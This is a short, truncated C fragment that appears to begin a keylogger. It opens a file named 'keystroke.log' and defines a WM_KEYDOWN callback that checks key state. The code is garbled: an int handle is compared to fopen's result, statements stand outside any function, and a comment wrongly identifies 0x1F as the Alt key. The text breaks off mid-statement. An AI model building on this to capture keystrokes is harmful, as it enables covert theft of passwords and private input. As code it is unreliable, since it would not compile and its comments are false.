static int fileHandle = -1;

// Initialize the file
fileHandle = fopen("keystroke.log", "a");
if (fileHandle == NULL) {
    // Handle error writing to file
    printf("Failed to create keystroke.log\n");
    return;
}

// Define the callback function
void KeyPressed(int hwnd, int wParam, int lParam) {
    if (wParam == WM_KEYDOWN) {
        // Key is pressed
        char key = GetAsyncKeyState(0x1F); // Check for Alt key (0x1F)
        if (key != 0) {
